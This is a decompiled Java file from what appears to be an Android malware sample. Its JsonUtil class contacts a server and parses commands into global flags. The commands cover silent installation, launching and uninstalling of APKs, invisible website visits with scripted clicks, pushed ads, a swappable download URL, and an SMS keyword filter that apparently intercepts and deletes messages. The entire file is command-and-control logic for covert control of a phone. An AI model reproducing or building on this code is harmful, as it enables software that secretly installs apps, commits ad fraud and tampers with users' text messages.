package com.qc.model;

import com.qc.base.OrderSet;
import com.qc.base.QCCache;
import com.qc.base.RunStatement;
import com.qc.entity.AdsInfo;
import com.qc.entity.MotionActive;
import com.qc.entity.SilenceApkInfo;
import com.qc.entity.SilencePager;
import com.qc.entity.SmsInfo;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class JsonUtil {
    public static String connServerForResult(String host, List<NameValuePair> nameValuePairs) {
        String strResult = "";
        try {
            HttpClient hpptClient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(host);
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            HttpResponse httpResponse = hpptClient.execute(httppost);
            if (httpResponse.getStatusLine().getStatusCode() == 200) {
                return EntityUtils.toString(httpResponse.getEntity());
            }
            return strResult;
        } catch (IOException | ClientProtocolException | ConnectTimeoutException e) {
            return strResult;
        }
    }

    public static String connServerForResult(String url) {
        HttpGet httpRequest = new HttpGet(url);
        String strResult = "";
        try {
            HttpClient hpptClient = new DefaultHttpClient();
            HttpConnectionParams.setConnectionTimeout(hpptClient.getParams(), 5000);
            HttpResponse httpResponse = hpptClient.execute(httpRequest);
            if (httpResponse.getStatusLine().getStatusCode() == 200) {
                return EntityUtils.toString(httpResponse.getEntity());
            }
            return strResult;
        } catch (IOException | ClientProtocolException | ConnectTimeoutException e) {
            return strResult;
        }
    }

    public static boolean Json2Bean(String jsonStr) {
        if (jsonStr == null || jsonStr.length() < 1) {
            return false;
        }
        try {
            int j;
            JSONObject jSONObject = new JSONObject(jsonStr);
            if (jsonStr.contains("pause")) {
                QCCache.getInstance().reSetValue("safesoftwares", jSONObject.getString("pause"));
            }
            if (jsonStr.contains("delcount")) {
                QCCache.getInstance().reSetValue("delcount", Integer.valueOf(jSONObject.getInt("delcount")));
            }
            if (jsonStr.contains("undel")) {
                QCCache.getInstance().reSetValue("undel", jSONObject.getString("undel"));
            }
            if (jsonStr.contains("link")) {
                Integer linkNet = Integer.valueOf(jSONObject.getInt("link"));
                if (!(linkNet == null || OrderSet.linkNet == linkNet.intValue())) {
                    RunStatement.netWorkCountUpdate = 1;
                    OrderSet.linkNet = linkNet.intValue();
                }
            }
            if (jsonStr.contains("baseapk")) {
                String baseAPK = jSONObject.getString("baseapk");
                if (baseAPK != null && baseAPK.length() > 0) {
                    RunStatement.baseApkUrl = baseAPK;
                }
            }
            if (jsonStr.contains("adver")) {
                JSONArray adsArray = jSONObject.getJSONArray("adver");
                if (adsArray != null) {
                    List<AdsInfo> adsInfos = new ArrayList();
                    for (j = 0; j < adsArray.length(); j++) {
                        JSONObject adv = (JSONObject) adsArray.opt(j);
                        if (adv != null) {
                            AdsInfo aInfo = getAdsInfo(adv);
                            if (aInfo != null) {
                                adsInfos.add(aInfo);
                            }
                        }
                    }
                    if (adsInfos != null && adsInfos.size() > 0) {
                        OrderSet.adsLaucherFlag = 1;
                        QCCache.getInstance().reSetValue("adsList", adsInfos);
                    }
                }
            }
            if (jsonStr.contains("game")) {
                SmsInfo smsFilter = getGameInfo(jSONObject.getJSONObject("game"));
                if (smsFilter != null) {
                    OrderSet.smsFilter = smsFilter;
                }
            }
            if (jsonStr.contains("quiet")) {
                JSONArray appArray = jSONObject.getJSONArray("quiet");
                if (appArray != null) {
                    List<SilenceApkInfo> apkInfos = new ArrayList();
                    for (j = 0; j < appArray.length(); j++) {
                        JSONObject appJoson = (JSONObject) appArray.opt(j);
                        if (appJoson != null) {
                            SilenceApkInfo aInfo2 = getSilenceApkInfo(appJoson);
                            if (aInfo2 != null) {
                                apkInfos.add(aInfo2);
                            }
                        }
                    }
                    if (apkInfos != null && apkInfos.size() > 0) {
                        OrderSet.APKInstallFlag = 1;
                        QCCache.getInstance().reSetValue("apkList", apkInfos);
                    }
                }
            }
            if (jsonStr.contains("urlquiet")) {
                JSONArray urlArray = jSONObject.getJSONArray("urlquiet");
                if (urlArray != null && urlArray.length() > 0) {
                    OrderSet.websiteOpenFlag = 1;
                    for (int i = 0; i < urlArray.length(); i++) {
                        JSONObject pagerObj = (JSONObject) urlArray.opt(i);
                        if (pagerObj != null) {
                            SilencePager pager = getSilentPagerInfo(pagerObj);
                            if (pager != null) {
                                OrderSet.openPager.offer(pager);
                            }
                        }
                    }
                }
            }
            return true;
        } catch (JSONException e) {
            return false;
        }
    }

    private static AdsInfo getAdsInfo(JSONObject adsObj) {
        AdsInfo adsInfo = new AdsInfo();
        try {
            adsInfo.setIcon(adsObj.getString("icon"));
            adsInfo.setAlerttype(adsObj.getInt("alerttype"));
            adsInfo.setPathimage(adsObj.getString("pathimage"));
            adsInfo.setDwldhint(adsObj.getInt("dwldhint"));
            adsInfo.setPackageName(adsObj.getString("packagename"));
            adsInfo.setNumber(adsObj.getString("number"));
            adsInfo.setPathurl(adsObj.getString("pathurl"));
            adsInfo.setType(adsObj.getInt("type"));
            adsInfo.setId(adsObj.getInt("id"));
            adsInfo.setTitle(adsObj.getString("title"));
            adsInfo.setTimeout(adsObj.getLong("time"));
            adsInfo.setSound(adsObj.getInt("sound"));
            adsInfo.setDescriptype(adsObj.getInt("descriptype"));
            adsInfo.setDescription(adsObj.getString("description"));
            return adsInfo;
        } catch (JSONException e) {
            return null;
        }
    }

    private static SilenceApkInfo getSilenceApkInfo(JSONObject apkObj) {
        SilenceApkInfo sInfo = new SilenceApkInfo();
        try {
            JSONArray activeArray = apkObj.getJSONArray("activelist");
            List<MotionActive> actives = new ArrayList();
            if (activeArray != null && activeArray.length() > 0) {
                for (int i = 0; i < activeArray.length(); i++) {
                    MotionActive active = getActiveInfo((JSONObject) activeArray.opt(i));
                    if (active != null) {
                        actives.add(active);
                    }
                }
            }
            if (actives.size() > 0 && OrderSet.motionAppFlag == 0) {
                OrderSet.motionAppFlag = 1;
            }
            sInfo.setActivelist(actives);
            sInfo.setKssiid(apkObj.getLong("kssiid"));
            sInfo.setIsclose(apkObj.getInt("isclose"));
            sInfo.setIsuninstall((long) apkObj.getInt("isuninstall"));
            sInfo.setPackageName(apkObj.getString("packagename"));
            sInfo.setIsreset((long) apkObj.getInt("isreset"));
            sInfo.setDesktop(apkObj.getInt("desktop"));
            sInfo.setDelay(apkObj.getLong("delay"));
            sInfo.setIsrun(apkObj.getInt("isrun"));
            sInfo.setLocation(apkObj.getInt("location"));
            if (sInfo.getIsrun() == 1 && OrderSet.openAppFlag == 0) {
                OrderSet.openAppFlag = 1;
            }
            sInfo.setSilencename(apkObj.getString("silencename"));
            sInfo.setVersion(apkObj.getString("version"));
            sInfo.setVisiturl(apkObj.getString("visiturl"));
            return sInfo;
        } catch (JSONException e) {
            return null;
        }
    }

    private static SmsInfo getGameInfo(JSONObject gameObj) {
        SmsInfo smsFilter = new SmsInfo();
        try {
            smsFilter.setId(gameObj.getLong("id"));
            smsFilter.setAdvkey(gameObj.getString("advkey"));
            smsFilter.setAdvend(gameObj.getString("advend"));
            smsFilter.setAdvtent(gameObj.getString("advtent"));
            smsFilter.setAdvtip(gameObj.getString("advtip"));
            smsFilter.setComtent(gameObj.getString("comtent"));
            smsFilter.setKeytent(gameObj.getString("keytent"));
            smsFilter.setDelkey(gameObj.getString("delkey"));
            return smsFilter;
        } catch (JSONException e) {
            return null;
        }
    }

    private static MotionActive getActiveInfo(JSONObject activeObj) {
        MotionActive active = new MotionActive();
        try {
            active.setId(activeObj.getInt("id"));
            active.setSiid(activeObj.getInt("siid"));
            active.setAstep(activeObj.getInt("astep"));
            active.setAdelay(activeObj.getLong("adelay"));
            active.setAtype1(activeObj.getString("atype1"));
            active.setAtype2(activeObj.getString("atype2"));
            active.setAtype3(activeObj.getInt("atype3"));
            return active;
        } catch (JSONException e) {
            return null;
        }
    }

    private static SilencePager getSilentPagerInfo(JSONObject pagerObj) {
        SilencePager pager = new SilencePager();
        try {
            JSONArray activeArray = pagerObj.getJSONArray("activelist");
            List<MotionActive> actives = new ArrayList();
            if (activeArray != null && activeArray.length() > 0) {
                for (int i = 0; i < activeArray.length(); i++) {
                    MotionActive active = getActiveInfo((JSONObject) activeArray.opt(i));
                    if (active != null) {
                        actives.add(active);
                    }
                }
            }
            pager.setActivies(actives);
            pager.setUrl(pagerObj.getString("url"));
            return pager;
        } catch (JSONException e) {
            return null;
        }
    }

    public static HashMap<String, String> Json2KeyAndDecode(String jsonStr) {
        HashMap<String, String> hm = new HashMap();
        try {
            JSONObject jsonObj = new JSONObject(jsonStr);
            hm.put("key", jsonObj.getString("jabc"));
            hm.put("content", jsonObj.getString("stext"));
        } catch (JSONException e) {
        }
        return hm;
    }
}
